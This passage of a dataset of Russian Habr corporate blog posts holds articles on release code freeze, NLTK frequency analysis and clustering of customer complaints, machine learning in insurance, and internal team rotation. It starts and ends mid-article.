защититься от подобных проблем, рекомендуется также применять автоматизированные инструменты. Здесь выбор остаётся за вами: это может быть и обычный grep, а может и статический анализатор кода.ЗаключениеПриведённые примеры наглядно демонстрируют, как даже незначительные ошибки могут перерасти в серьёзные проблемы на этапе выполнения программы. Независимо от того, связаны ли недочёты с неправильной инициализацией членов, ошибками переопределения виртуальных функций или с расширением стандартных пространств имён, своевременное обнаружение и устранение подобных уязвимостей является залогом создания стабильного и надёжного программного обеспечения.Надеюсь, что наша трилогия о Nau Engine станет полезным ориентиром для разработчиков, поможет избегать типичных ошибок и повышать качество проектов. Стоит применять полученные знания на практике, постоянно анализировать и совершенствовать свой код, а также делиться опытом с коллегами. Ведь успешная разработка это не только владение техническими навыками, но и способность учиться на ошибках и стремиться к постоянному развитию.Как говорил Эдсгер Дейкстра: 'Тестирование показывает наличие ошибок, а не их отсутствие'. Поэтому важно не только исправлять баги, но и изначально писать код так, чтобы их было как можно меньше.Благодарю за внимание!"
80,Немного о качестве в продуктовых командах. CodeFreeze,Сбер,"Технологии, меняющие мир",0,"Программное обеспечение, Мобильные технологии, Веб-сервисы",2025-04-09,"«Однажды в далёкой, далёкой галактике...»Иван работал QA-инженером в довольно большой команде. Команда занималась сразу несколькими проектами, связанными между собой. Команда была дружная, у каждого участника в глазах был тот самый огонёк, заставлявший всё время изобретать и не дававший сидеть на месте. Ивану это нравилось. Каждый релиз был для команды новым вызовом, и Андрей, лидер команды, часто повторял: «Я вообще не понимаю, что у нас происходит».На очередном планировании спринта (а команда работала по Scrum), Андрей увидел в бэклоге несколько задач, которые висели там уже несколько месяцев. — А разве мы не зарелизили уже эти фичи? — Зарелизили, они уже в проме. — А когда? — Примерно пару релизов назад, как-раз месяц прошёл. — Хорошо, но что-то я не помню. Точно в проме уже? Тогда закрыть надо... А эти задачи мы готовы выкатить? Напоминаю, по плану у нас выкатка ПСИ назначена через неделю, будет окно у безопасников. — Так-то готовы, но я сейчас там как раз заканчиваю ещё одну фичу, можно будет всё сразу выкатить. — ответил один из разработчиков. — Здорово! А сколько времени тебе надо, чтобы закончить? — Пара часов буквально. До завтра сделаю. В крайнем случае — завтра. — Ну хорошо, давайте пока не собирать релиз, подождем. — принял решение Андрей.На следующий день на дейли Иван задал вопрос: — Как там дела с релизом? Пора бы уже его выкатывать на стенд ИФТ и начинать тестирование. Компонентов много, интеграционное тестирование будет сложным. — Ну, я почти закончил ту фичу. Правда, там появилась зависимость от другого модуля, и нужны изменения в pipeline  со стороны DevOps. И да, я уже не могу разделить фичи. Там работы буквально на пару часов осталось, закончу сегодня, как и обещал.Примерно такой же разговор состоялся и на третий день, и тогда выяснилось, что фича была готова накануне поздно вечером, а для правки pipleline нужен ещё день. На четвёртый день релиз собрали. Началось тестирование в том его виде, когда пытаются успеть всё сделать в последний момент. На следующий день было ПСИ.Что такое «Отсечка релиза»?Отсечка релиза, или Code (Feature) Freeze, это этап в разработке ПО, который предназначен для устранения риска возникновения ошибок в последний момент перед релизом. В условиях нехватки времени на разработку, строгих дедлайнов и множества задач (особенно с учётом метрики LeadTime в Сбере) этим этапом часто пренебрегают.Отсечка релиза позволяет проверить RC (Release Candidate — кандидат в релизы) на отсутствие дефектов и, в случае нахождения таких дефектов, исправить их.Применение отсечки вовсе не означает, что разработка останавливается: она продолжается на отдельных ветках, а найденные дефекты исправляют в самом релизе, либо в последующих.Отсечка также не означает, что тестирование останавливается с момента выкатки текущего релиза до отсечки следующего. В это время идёт разработка новых тестов, локальное тестирование фич, подготовка окружения.С другой стороны, отсечка позволяет разграничить процессы разработки и тестирования именно в рамках текущего релиза.«Новая надежда» — Предлагаю ввести отсечку релизов, — Иван был настойчив. С другой стороны, ретро на закрытии спринта для того и нужно, чтобы обсуждать проблемы и предлагать идеи. — Что-то сомневаюсь, что это будет полезно. А что, если я немного не успею закончить фичу? Откладывать до следующего релиза? Звучит как-то не очень. — Мне тоже не нравится. Получается, что я должен заранее «подписываться» под конкретные даты… — А я не знаю… У нас вроде и так всё неплохо было. — Коллеги, мне тоже было бы удобнее планировать релизы, — Андрей рассуждал вслух. — У нас есть проблемы с окнами для выкатки на ПСИ, без этого мы не можем двигаться дальше. С другой стороны, мы можем забронировать время на несколько недель вперёд, но тогда мы должны понимать, что релизы должны выходить регулярно. — Ещё один плюс отсечки — история, можно будет не вспоминать, когда и что было выпущено. Релизов у нас много, зависимостей — ещё больше. История релизов поможет решить проблему, — несмотря на тяжёлый спринт, Иван хорошо подумал над преимуществами и недостатками своего предложения. — А как насчёт багов? Когда их править? Вот найдём на тестировании проблемы, и что, не исправлять их теперь? — Баги можно и нужно исправлять. Особенно критические. Баги с низким приоритетом можно исправить в следующем релизе, запланировав их в спринт. — Ладно, давайте попробуем. Один-два релизных цикла, а там посмотрим. Не понравится — откажемся, — решил Андрей.Что даёт отсечка?У разработчиков появляется уверенность, что в релиз уходит именно ожидаемая конфигурация продукта. Это особенно важно, если в разработке находятся зависимые компоненты или разработка ведётся совместно.Для QA-инженеров появляется гарантированное окно в жизненном цикле продукта, когда можно проводить регрессионное тестирование, не опасаясь, что очередное изменение заставит переделывать всю работу с нуля. Также упрощается локализация дефектов и отслеживание их истории (например, для поиска источника проблемы и понимания масштаба влияния).У руководителей появляется понимание, какие фичи готовы к релизу, а какие нет; насколько команда близка к достижению поставленных целей. Также отслеживаются зависимости связанных компонент и продуктов.Как выбрать дату отсечки?Отсечка — не формальный инструмент. Для начала нужно определиться с желаемой частотой релизов. Их регулярность добавляет предсказуемости результату и прозрачности процессу разработки.Также нужно выделить время на тестирование. Оно определяется как среднее время по историческим данным. Например, в проекте Provisioning команды CMDB Inventory периодичность релизов — две недели, а время, необходимое на полное тестирование (регресс и новая функциональность) — 4 дня. Таким образом, к концу шестого рабочего дня в релиз вносят все готовые фичи и исправления. Задачи со статусом «ну вот ещё пару часиков, и всё» в релиз не попадают.Как сделать процесс отсечки более прозрачным?Есть несколько рекомендаций на этот счёт:Выпускать версии регулярно.Для наполнения релизов в день отсечки лучше назначить отдельную встречу, посвящённую только этому вопросу. На встрече должны быть разработчики (ответственные за функциональность в релизе), QA-инженеры (подготовка к тестированию релиза), аналитики (убедиться, что все зависимости готовы) и владельцы продукта (понимание объёма выполненных работ и степени готовности продукта в целом).Составить «Карту релизов» — таблицу, в которой будет название и номер релиза, дата отсечки, состав релиза (Bugfix и название задач на разработку новых фич из Jira), планируемая дата выхода на ПСИ, а также контакты людей, ответственных за разработку. Карта релиза должна содержать информацию о прошлых, текущем и будущих релизах. Это поможет в планировании, наглядно показывая все зависимости.Заполнять карту релизов по мере выполнения задач, что сэкономит время на встречах. Этим могут заниматься QA-инженеры и/или релиз-менеджеры, как самые заинтересованные в этом процессе люди.Не пытаться добавить функциональность в релиз в последний момент.Регулярно пересматривать окно тестирования как в большую, так и в меньшую сторону для будущих отсечек, но не делать этого слишком часто. Статистические отклонения ещё не повод к резким изменениям процесса.Как можно разделить релизы?Для разделения релизов хорошо подходят ветки. Каждый релиз можно собирать в своей отдельной ветке, куда после отсечки также будут вливаться исправления найденных дефектов.В случае использования компилированных сборок есть вариант использования стендов. Так как все сборки хранятся в Nexus, а для тестирования используется (в идеале) стенд ИФТ, то новые сборки нельзя раскатывать на ИФТ до тех пор, пока не закончится тестирование текущего релиза.«Империя наносит ответный удар» — Привет всем, давайте начнём фиксацию релиза. В прошлый раз мы запланировали пять релизов. Мы готовы их выкатывать? Давайте посмотрим… — Иван открыл первый релиз из списка в карте релизов. — Так, все фичи сделаны, переведены в QA… Отлично! Есть что-то, что осталось здесь сделать? — Надо подтянуть секреты на стенды и подготовить pipeline-ы для выкатки. — Вадим, когда можно ожидать новые пайпы?Вадим, DevOps-инженер команды, задумался: — У меня сейчас очень большая нагрузка. До вечера не успею. — Хорошо, тогда отложим релиз этого модуля на следующий раз.Через две недели (стандартный принятый релизный цикл) на митинге, посвящённом фиксации релизов, обсуждение повторилось: — Вадим, как там про пайпы для модуля? — Нет, ещё не приступал. Занят другими модулями. — Хорошо. А что у нас с зависимостями от этого модуля? — У нас ещё два модуля зависят от новой функциональности. Они готовы к выкатке, но работать не будут. — А мы можем подождать ещё?Что может пойти не так?Могут быть задержки в проверке релизов на ПСИ, могут быть зависимости от других команд, могут быть проблемы с выкаткой сборок на стенды. При этом сроки релизов, конечно, будут сдвигаться в бо̒льшую сторону. В таких ситуациях стоит проанализировать проблему и найти способы её недопущения в будущем.«Пробуждение силы»Команда решила проводить короткие встречи, посвящённые релизам, каждую неделю при двухнедельном релизном цикле. Это позволило понимать, где в данный момент находится команда. — Коллеги, у нас накопилось много релизов, завязанных на конкретную функциональность. Pipeline-ы готовы, давайте выкатим эту фичу на неделю раньше, протестируем её отдельно. Это позволит лучше протестировать остальные модули, а заодно уменьшит нагрузку на QA и DevOps. Что скажете? — Да, звучит вполне разумно. Давайте так и сделаем. — У нас уже запланированы релизы на два месяца вперёд. У кого-нибудь есть вопросы, чем предстоит заниматься ближайшее время? Может быть, есть идеи, что можно выкатить ещё? — Так-то всё понятно, только вот сейчас заканчиваю функциональность, которую мы не планировали выкатывать ближайшее время. Давайте запланируем релиз? — Да, конечно. У него будут какие-нибудь зависимости? Вадим знает, что от него ожидается? Стоит добавить задачу на DevOps?"
81,Методы анализа текстовых данных пользовательских обращений,Т-Банк,Компания,0,"Программное обеспечение, Электронная коммерция, Веб-сервисы",2025-04-09,"В прошлой статье мы исследовали проблему слишком навязчивой или нерелевантной рекламы, которая может ухудшить пользовательский опыт и вызвать негатив клиентов. Для повышения качества взаимодействия мы исследовали возможности сокращения отказов от рекламного контента, используя алгоритм машинного обучения, учитывающий персональные предпочтения пользователей.Хотя процент уникальных обращений на линию поддержки с проблемой от рекламы затрагивает менее 0,2% от MAU, учитывая масштаб активной базы пользователей, на ежемесячной основе мы получаем порядка 20 тысяч сообщений о проблемах, связанных с рекламными уведомлениями.Такая обратная связь невероятно важна, ведь в ней содержится ценная информация о проблемах, связанных с рекламными коммуникациями, и возможностях их улучшения. Из-за большого объема сообщений ручной анализ становится невозможным. Наша задача — выявить ключевые паттерны и категории жалоб, автоматизировав анализ текстовых данных с использованием обработки естественного языка (NLP) и алгоритмов кластеризации. В этой статье рассмотрим, как такие подходы позволяют структурировать отзывы пользователей и находить инсайты для оптимизации маркетинговых стратегий.Частотный анализ слов  С точки зрения технической реализации самый простой способ — это анализ частотности употребления отдельных слов в текстах обращений. Такая методика не позволяет провести семантический анализ или оценить тональность текста, однако благодаря этому способу можно быстро определить верхнеуровневые проблемы (в контексте отказа от рекламы) относительно простым алгоритмом на Python. При необходимости можно также оценить содержание обращений с часто употребимыми словами. Очевидный недостаток метода — пренебрежение контекстом употребления. Но в случае работы только с негативными обращениями эта проблема нивелируется спецификой тематик обращений. Этапы применения частотного анализа слов:Предварительная обработка текста, когда все отдельные обращения собираются в единый сплошной текст. А сплошной текст переводится в единый регистр и очищается от любых символов, в том числе пунктуационных знаков.Токенизация текста — разбиение на составные части (токены). В контексте нашей задачи один токен равен одному слову.Удаление базовых шумовых слов. К таким относятся часто употребимые, но не имеющие ценности с точки зрения аналитического вывода слова. Например, союзы, частицы и так далее. Еще в этом пункте следует объединить однокоренные слова среди самых высокочастотных.Подсчет статистики и анализ полученного распределения. В случае необходимости — возвращение к удалению шумовых слов и повторение процесса качественного извлечения целевых слов.Важно отметить, что при такой логике мы теряем информацию о принадлежности отдельных слов к конкретному обращению. Если в одном обращении фигурирует выделенное слово большое число раз, это может искажать статистику. Возможным вариантом решения является предварительная обработка в рамках отдельных сообщений, что, однако, приведет к усложнению технической реализации.Пример кода реализации:# Предположим, есть df с колонкой rej_reason  # — в которой построчно содержатся причины отказов # Сделаем единый текст из всех строк DataFrame # при помощи конкатенации строк .cat() на выходе str text_1 = df.rej_reason.str.cat(sep=' ')  # Переведем весь текст в нижний регистр text_2 = text_1.lower()  # Стандартный набор символов для удаления из текста import string spec_chars = string.punctuation print(spec_chars)  # Для удаления символов используем поэлементную обработку текста:  # к пустой строке добавляем символы из text_2 при условии,  # что они не входят в набор spec_chars: цифры не удаляются # На выходе текст без символов text_3 = """".join([ch for ch in text_2 if ch not in spec_chars])  # Промежуточно можем посмотреть на первые 1000 символов text_3[:1000] # Можно также объявить простую функцию, которая удаляет указанный  # набор символов из исходного текста: def remove_chars_from_text(text, chars):  return "" "".join([ch for ch in text if ch not in chars])  # Разбиваем текст на слова — токены.  # Для этого можно использовать готовый метод библиотеки NLTK: import nltk from nltk import word_tokenize nltk.download('punkt_tab') # Получение отдельных токенов (слов): text_tokens = word_tokenize(text_3)  # Для применения инструментов частотного анализа библиотеки NLTK  # необходимо преобразовать список токенов к классу Text,  # который входит в эту библиотеку: text_all = nltk.Text(text_tokens)  # Библиотека NLTK содержит готовые списки стоп-слов для различных языков.  # Получим список стоп-слов для русского языка: import nltk from nltk.corpus import stopwords nltk.download('stopwords') russian_stopwords = stopwords.words(""russian"")  # Список стоп-слов может быть расширен с помощью стандартного метода extend: russian_stopwords.extend(['это', 'нею'])  # Очищаем текст: text_clear = [word for word in text_all if word not in russian_stopwords]  # Для подсчета статистики распределения частот слов в тексте  # применяется класс FreqDist (frequency distributions): from nltk.probability import FreqDist fdist = FreqDist(text_clear) fdist.plot(30,cumulative=False)В результате многократной фильтрации — удаления и объединения слов — получаем распределение наиболее частотных и важных с точки зрения контекста словПример распределения закона Ципфа и отхождение от теоретического распределения после обработки слов — распределение частот топ-21 словаИсходя из полученного распределения (топ-21 слово), можем сделать следующие выводы:1. В большей степени негатив клиентов происходит из-за нерелевантных звонков. Потом по убыванию идут СМС-уведомления, email- и баннерные рассылки, замыкают топ упоминаемых каналов пуш-уведомления.2. В контексте отдельных продуктов основное упоминание приходится на кредитные продукты.3. Иные причины: мешают взаимодействию, слова «день» и «каждый» в контексте негативных обращений означают излишнюю частотность коммуникаций.Кластерный анализ обращенийВ основе кластерного анализа лежат методы поиска ближайших соседей. Этапы применения подхода в нашем случае выглядели так:Разметка обращений по упоминаниям отдельных банковских продуктов до уровня бизнес-направления с помощью регулярных выражений. В нашем случае — 14 с учетом группы отсутствия упоминания конкретного продукта. В общем случае группировка может основываться на направлениях работы продуктовых команд или иной логике разбиения по существующим бизнес-направлениям. Далее по каждому выделенному направлению.Эмбеддинг текста — векторное представление с помощью модели BERT.Применение UMAP для снижения размерности данных, а для кластеризации текста — алгоритма HDBSCAN.Выбор оптимального числа кластеров методами локтя и силуэтного анализа.Определение полученных тем с помощью T-Pro. Построение дашборда на основе полученных кластеров в Apache Superset.Точность разметки регулярными выражениями проверялась вручную на выборочных данных для каждой бизнес-темы и составила по метрике среднего Accuracy 92%. Методы кластеризации определяют отдельные группы, но не дают описания выделенных кластеров. Поэтому для определения тем полученных групп применялся T-Pro. Такая современная технология позволяет также проводить семантический и лингвистический анализ текста, а также оценить его тональность.Распределение абсолютного числа обращений по бизнес-темам по месяцам  Полученные данные легко анализировать в разрезе выбранного временного периода. Первый этап позволил сразу же определить характерную особенность негативных обращений: от 60 до 80% обращений происходят без конкретизации причины отказов.При таком подходе сохраняется контекст индивидуальных обращений, что позволяет найти гораздо больше информативных проблемных паттернов в маркетинговых стратегиях в сравнении с первым подходом, а еще оценить их количественные масштабы.Распределение итоговых тем и облако тегов по итогам кластеризацииОсновные проблемы рекламы связаны:1. С несоответствием предодобренных банковских продуктов их последующему предложению и фактическому решению при подаче заявки. Скоринговые модели могут быть чувствительны, и отдельные результаты таких алгоритмов всегда имеют некое расхождение с группой пользователей с предодобренными продуктами.2. Проблемами таргетинга. В результате этого могут быть предложены продукты, недоступные в регионе нахождения клиента.3. Чувствительными возрастными группами. Пользователи с детьми выражают беспокойство ввиду возможного случайного оформления банковских продуктов детьми. Аналогичная проблема существует и с группой пользователей пожилого возраста.;4. Ошибочной временной зоной. Малая часть коммуникаций может прийти в ночное время, что вызывает беспокойство клиентов.5. Излишней частотой коммуникаций.6. Промотированием спецпредложений, акций, игр и других неклассических банковских активностей.7. Отдельными маркетинговыми стратегиями, упоминание которых выходит на уровень масштаба общих проблематик.Последний пункт особенно полезен в контексте анализа отдельных маркетинговых промо и А/Б-тестов. Такой анализ предоставляет возможность получить обратную связь от пользователей, получивших маркетинговые уведомления конкретного А/Б-теста. Это позволяет сделать выводы о причинах возникновения дополнительных отказов от рекламы (в сравнении с контрольной группой).Выводы  Анализ обращений пользователей позволяет не только выявлять конкретные проблемы рекламы, но и системно улучшать маркетинговые стратегии, делая их более персонализированными и ненавязчивыми. Применение методов обработки текстовых данных и машинного обучения помогает находить закономерности, которые сложно заметить вручную, и своевременно реагировать на негативные тренды. Такой подход не только снижает уровень раздражения клиентов, но и повышает эффективность рекламных коммуникаций. Впереди еще много интересных тем и сложных подходов. До встречи в новых исследованиях!"
82,Машинное обучение в страховании: как ИИ и большие данные меняют подходы к оценке рисков и борьбе с мошенничеством,Росгосстрах,РГС — технологии жизни без тревог,0,"Программное обеспечение, Электронная коммерция",2025-04-09,"Привет, Хабр!Меня зовут Дмитрий, я дата-сайентист в команде моделирования Росгосстраха. Страховые компании активно обращаются к технологиям машинного обучения (ML) и искусственного интеллекта (ИИ) для формирования тарифов, борьбы с мошенничеством, оптимизации различных процессов и улучшения качества обслуживания клиентов. В этом обзоре я хочу рассказать о том, как ML/ИИ трансформирует процессы в страховом секторе. Посмотрим, как технологии интегрируются в повседневную работу крупной страховой компании на примере нескольких характерных задач. Машинное обучение в страховой отраслиСогласитесь, что практически все люди в своей жизни сталкиваются с потребностью в страховании. Кто-то хочет застраховать новую машину, кто-то стремится защитить квартиру от залива, а кто-то – иметь подушку безопасности в случае проблем со здоровьем. Ключевой особенностью большинства неприятных событий является их принципиальная случайность, неожиданность. Страховой бизнес – одна из старейших областей, которая использует статистику и анализ данных как основу для своей деятельности. Исторически, в контексте страховой практики, соответствующий раздел математики называли актуарными расчетами.Распространенные модальности данных и классические задачи в страхованииВ повседневной жизни для большинства из нас страхование – это просто бумажный или электронный полис, который лежит на всякий случай. А тем временем, за кулисами корпораций, современное страхование – сложная область, охватывающая широкий спектр математических и технологических задач. Часть из них, такие как оценка риска или спроса клиентов – классические проблемы, для которых трансформируются подходы к решению, другая же часть – новые задачи, которые ранее невозможно было удовлетворительно решить в принципе (в эту группу, например, входят задачи автоматизации процессов). Так из чего же складывается моделирование в страховом деле?Почему ваш страховой полис дороже, чем у соседа? Моделирование рискаЗадумывались ли вы, почему у одного водителя полис каско стоит 60 тысяч рублей, а у другого 45 тысяч? Почему одним клиентам дают хорошую скидку на страхование, а другим, наоборот, повышающий коэффициент? Неужели дело только в щедрости и маркетинговой политике? Одна из непростых задач, которая всегда стояла перед страховщиками, - расчет вероятности наступления того или иного страхового события и оценка ожидаемой тяжести его последствий. Итоговая стоимость полиса непосредственно связана со степенью риска, присущей конкретному клиенту. Точность прогнозирования тут особенно важна, для того чтобы страховая компания смогла возместить ущерб всем страхователям. На стоимость полиса влияет множество факторов, связанных с клиентом, объектом страхования и т.д.  Например, большинству интуитивно понятно, что менее опытный молодой водитель в среднем склонен к большей аварийности, чем человек старшего возраста с большим стажем. При этом задача страховщика – количественно оценить влияние каждого такого фактора на степень риска. Последние несколько декад в качестве инструмента для решения этой задачи доминировали подходы, связанные с обобщенными линейными моделями (Generalized Linear Model, GLM). Эти модели представляют собой обобщение линейной регрессии с гауссово-распределенной ошибкой на более широкий класс процессов. Все дело в том, что частота наступления страховых событий и их тяжесть не описываются нормально-распределенными случайными величинами.Типичный вид зависимости частоты страховых случаев от возраста водителя и предсказания GLM с небольшим числом факторов (модель построена на открытых данных)Разумеется, GLM сами по себе уже являются представителями моделей машинного обучения. Однако прогресс не стоит на месте, и страховые компании стремятся внедрять все более продвинутые методы в свои процессы.За последние годы развитие машинного обучения дало множество инструментов, таких как градиентный бустинг над решающими деревьями (GBDT) и трансформеры (в том числе для работы с табличными данными, такие как FT-Transformer), которые Росгосстрах использует в различных сценариях. В то время как GLM имеет большие преимущества перед данными алгоритмами в аспекте интерпретируемости, обобщенным линейным моделям сложно учитывать нелинейности моделируемого процесса. Эти проблемы естественным путем решаются в GBDT и Tabular Transformers, что помогает достигать большей точности в определенных сценариях. Кроме того, эти и другие нейросетевые алгоритмы хорошо встраиваются в автоматизированные пайплайны и позволяют удобным образом обрабатывать модальности данных, которые может быть затруднительно учесть без использования глубокого обучения.Пространственные данные «под капотом»Представьте, что ваше место проживания может повлиять на стоимость полиса каско! В самом деле, одним из важных факторов в анализе риска является роль географической локации. Особенности населенных пунктов и районов, где проживает клиент, различные демографические показатели, структура дорог, маршрут клиента, наличие камер наблюдения и другие аналогичные параметры сильно влияют как на вероятность наступления страхового события, так и на размер ущерба. Такие данные, называемые пространственными (spatial), или же геоданными, являются характерным примером той самой нетривиальной модальности. Для работы с ними используем высокогранулированное деление карты России на зоны 100x100 метров – геосетку. Пример покрытия части пространства геосеткойКаждому участку геосетки сопоставляются как классические, интуитивно понятные показатели, так и полученные с использованием моделей машинного обучения – векторные представления геоклеток. В частности, при решении такой задачи мы используем методы обучения без учителя из компьютерного зрения. Дальнейшее использование этих данных в моделях расчета риска позволяет сделать обоснованные выводы относительно аварийности и опасности геолокаций с большой детальностью, в том числе экстраполировать знания на малые города, в которых экспертное понимание может быть затруднено.Выгода аккуратного водителя. Как страховая компания учитывает вашу историюЕсли вы водите машину, старайтесь ездить аккуратно: это не только безопасно, но и выгодно. Ведь важным аспектом у любого страховщика является анализ страховой истории клиентов. Очевидно, что компания больше «доверяет» клиенту, который много лет не попадал в аварии. Традиционно для учета истории страховых случаев используется коэффициент бонус-малус (КБМ). В этой методике каждый водитель на основании своих убытков и количества безаварийных лет вождения «попадает» в один из классов, которому сопоставляется определенное число – КБМ. Данный показатель может служить хорошим признаком для аналитики и использоваться в различных моделях. Тем не менее, такое представление в виде единственного числа имеет свои ограничения. Мы в Росгосстрахе пошли дальше и анализируем всю историю вашего взаимодействия с компанией, используя информацию не только из полисов автострахования, но и принимая во внимание другие ваши страховки, например, квартиры.Примеры последовательностей событий для различных клиентовБлагодаря алгоритмам машинного обучения для обработки последовательностей событий учитывается вся совокупность различных продуктов, приобретенных клиентом, порядок их приобретения, убыточность по каждому полису, временные интервалы между событиями и так далее. В частности, нейросети позволяют на основании этих данных получить универсальные, легко переиспользуемые векторные представления для клиентов.Как нейросети борются с преступниками. Антифрод модели в страхованииОдной из главных задач, стоящих перед страховой компанией, является выявление и предотвращение действий со стороны мошенников. Задумывались ли вы, что преступники приносят проблемы не только страховщику, но и вам - порядочным клиентам, и вы начинаете переплачивать? Мошенничество вызывает неконтролируемое кросс-субсидирование, - ситуацию, в которой недобросовестные покупатели попадают в одну тарифную группу с обычными, что может приводить к завышению цен для последних. Для борьбы со злоумышленниками используются антифрод модели, с помощью которых можно выявлять подозрительные случаи как на этапе оформления полисов, так и на основании анализа страховых случаев.Клиенты и транспортные средства образуют вершины графаРосгосстрах использует графовые базы данных для хранения связей между клиентами и транспортными средствами, таких как, например, участие в одном расчете или ДТП. Конечно, анализ структур в таком графе зачастую затруднителен для человека в силу его размера и нетривиальности мошеннических схем. Тут нам на помощь приходят графовые модели машинного обучения, позволяющие в автоматизированном режиме находить сомнительные паттерны.Ваше мнение учитывают? Как ИИ обрабатывает отзывы клиентов Любая компания стремится становиться лучше, и важную роль в этом процессе играет, конечно же, обратная связь от клиентов.  Сегодня большие языковые модели (LLM) позволяют анализировать, классифицировать, категоризировать и суммаризировать текстовые отзывы, а модели автоматического распознавания речи (ASR) используются для обработки аудиозаписей в контакт-центре, снижая время, затрачиваемое на эти процессы. ИИ помогает быстрее и точнее выявлять проблемы, с которыми столкнулись клиенты, определять их потребности и оперативно реагировать на запросы. Обработанные отклики используются коллегами и для аналитики, например, для расчета степени потребительской лояльности NPS (Net Promoter Score).Скорость важна! Распознавание документовВ данный момент существует множество алгоритмов для решения задачи OCR (оптического распознавания символов), включая трансформерные модели. Они позволяют страховой компании автоматически распознавать данные паспортов, полисов и других документов, повышая точность ввода данных и помогая оптимизировать процессы. Помимо обработки традиционного пакета документов есть и менее тривиальные сценарии использования. Допустим, заявку на покупку полиса подает клиент, у которого имеется длительная история взаимодействия с другим страховщиком. Логично предположить, что если иная страховая компания год за годом пролонгировала страховку, то клиент добропорядочный. Обычно для подтверждения подлинности полиса другой страховой компании нужно задействовать сотрудника отдела андеррайтинга. Обработка таких документов с помощью ИИ сэкономит его время и повысит скорость и эффективность принимаемых решений.А фара цела? Детекция поврежденийРосгосстрах активно развивает сервисы распознавания повреждений по фотографиям. Модели компьютерного зрения (CV) решают задачу детекции повреждений на фотографиях осмотра, оценки их количества и степени тяжести, определения влияния состояния машины на риски клиента или более точной оценки необходимых резервов при страховом событии.Будущее машинного обучения в страхованииВ общем, страхование всегда шло рука об руку с машинным обучением, и есть понимание, что это движение продолжится. Уверен, что все текущие тренды ИИ, такие как новые поколения больших языковых моделей и диффузионных сетей, найдут свое применение в нашей индустрии.К примеру, последние несколько месяцев горячей темой были различные LLM модели: выход высокопроизводительной сети от Deepseek без преуменьшения изменил ландшафт этой темы. У страховых компаний есть потребность в эффективных LLM / RAG системах как для взаимодействия с клиентами, так и для внутреннего пользования: агентам требуется помощник по внутренней документации, продуктам компании и информации по клиентам, другим же сотрудникам удобно иметь умных ассистентов, помогающих в общении, подготовке материалов или других рутинных задачах. Я думаю, что такие эффективные открытые модели, как Deepseek, позволят компаниям, не обладающим неограниченными ресурсами, оптимально решать эти задачи.Перспективным направлением развития автострахования является телематика. Сейчас эта технология используется, например, в сервисах такси. Машинное обучение предоставляет способы для автоматизированной обработки информации о стиле движения, частоте и характере использования транспортного средства. Несмотря на то, что подавляющее большинство страхователей относятся в высшей степени осторожно к данной технологии, она позволила бы экономить средства обычным водителям. Здесь в голову приходит аналогия с изначальным недоверием в целом к технологиям ML, например, к системам видеонаблюдения, которые тем не менее позволили серьезно снизить уровень преступности.Так или иначе, в условиях растущего объема и разнообразия данных, ИИ является ключевым инструментом для сохранения конкурентоспособности страховых компаний."
83,Гайд по ротации в IT: как сменить команду и не пожалеть об этом,AvitoTech,У нас живут ваши объявления,0,"Веб-разработка, Электронная коммерция, Веб-сервисы",2025-04-09,"Привет! Меня зовут Дмитрий. Я начал свой путь в Авито шесть с половиной  лет назад на позиции middle-фронтендера. Практически сразу я познакомился с ротацией — механизмом перехода сотрудника в другой сервис или команду внутри компании. Мой путь был разнообразен, красочен и местами тернист, ведь за все время работы я сменил шесть команд. В этой статье я рассказываю о том, почему так часто менял работу, объясняю, почему не считаю ротацию простым переходом между командами, разбираю трудности, с которыми столкнулся, и делюсь чек-листом, который позволит вам ротироваться максимально удачно.Внутри статьи:Виды ротаций, в которых я участвовалЛичный примерСложности, с которыми я столкнулсяЧек-лист для успешной ротацииИтогВиды ротаций, в которых я участвовалЗа время работы я сталкивался с разными типами ротации:перерос команду. Когда в текущей команде уже не было задач моего уровня, меня переводили туда, где я мог реализовывать свой потенциал;подкрепление соседнего юнита. Когда не хватало ресурсов, а сроки горели, меня временно переводили в другую команду на полгода;масштабирование. Когда одна команда перерастала в юнит, приходилось делить ее на несколько команд и нанимать новых сотрудников;ротация к себе. Будучи руководителем, я дважды решал, кого взять в команду: сотрудника по ротации или нанять нового специалиста извне;ротация сотрудников. Если видел, что кто-то заскучал или перерос команду, предлагал ему ротацию. В вертикали «Товары»  я так набирал сотрудников на четыре команды, комбинируя «старичков» и новых людей;личная ротация. Я сам менял команды как инженер и руководитель, проходя через разные этапы адаптации и роста.Тут еще больше контентаЛичный примерПридя в компанию на frontend-позицию, я практически сразу начал писать на Go и стал fullstack-разработчиком. Уже через квартал мне предложили на полгода перейти в другую команду на бэкенд. Тогда я воспринял это как возможность прокачаться, ничего особо не планировал, и переход оказался успешным. Но когда срок подходил к концу, мне предложили остаться. Я же решил вернуться в первую команду на фронтенд.Позже наша команда разделилась на две. Это и стало моей второй неявной ротацией. Спустя некоторое время мне предложили новую роль — руководить командой в юните. Это был уже полноценный переход на управленческую позицию, но специфика работы стала совершенно другой. Я проработал в этой роли полтора  года, однако постепенно начал осознавать, что хочу сменить направление.К тому моменту я уже два с половиной года занимался внутренними продуктами и понял, что хочу попробовать что-то новое. Рассматривал несколько команд и в итоге выбрал «Автозапчасти» — тематику, которая была мне ближе всего. Там я проработал два года: за это время команда выросла с одной до четырех, но я остался в первой. Позже взял под управление сразу две команды — первую и четвертую.Очередная ротация получилась отчасти неожиданной. Я решил перейти в другую вертикаль, но на этот раз без четкого плана. В отличие от прошлых переходов, которые проходили гладко и соответствовали моим ожиданиям, этот раз оказался сложнее: я недостаточно пообщался с будущей командой до перехода и не учел важных нюансов.Сложности, с которыми я столкнулсяРотация без четкого плана. Важно заранее понимать, какие задачи и вызовы ждут в новой команде.Долгое отсутствие лидера в команде. Если команда жила какое-то время без руководителя, то накопившиеся критические зоны (например, техдолг) могут усложнить адаптацию.Продукт на плато. Если команда занимается поддержкой продукта, а не развитием, важно осознанно делать такой выбор.Период наведения порядка. Иногда первое время уходит на стабилизацию процессов, и это нужно учитывать.Обратная связь от прошлого руководителя. Важно заранее зафиксировать обратную связь, чтобы понимать с чем стоит поработать самостоятельно и какие вводные будут у нового руководителя.На основе личного опыта я собрал чек-лист, который поможет увидеть всю картину и проанализировать потенциально привлекательные аспекты и возможные сложности, которые предстоят при переходе. Жми сюда!Чек-лист для успешной ротации1. Зафиксировать обратную связь перед уходом:получить фидбек от текущего руководителя и команды, записать его;понять, какая информация будет передаваться в новую команду;проверить mNPS (насколько команда готова рекомендовать тебя как руководителя);изучить оценки в ревью-системе за последние 2-3 ревью.2. Четко сформулировать, зачем мне нужна ротация:честно ответить на вопрос: «Почему я ухожу?»;определить, что я ожидаю от новой команды;если ротация связана с недостатками в текущем месте, понять, как я пытался их исправить.3. 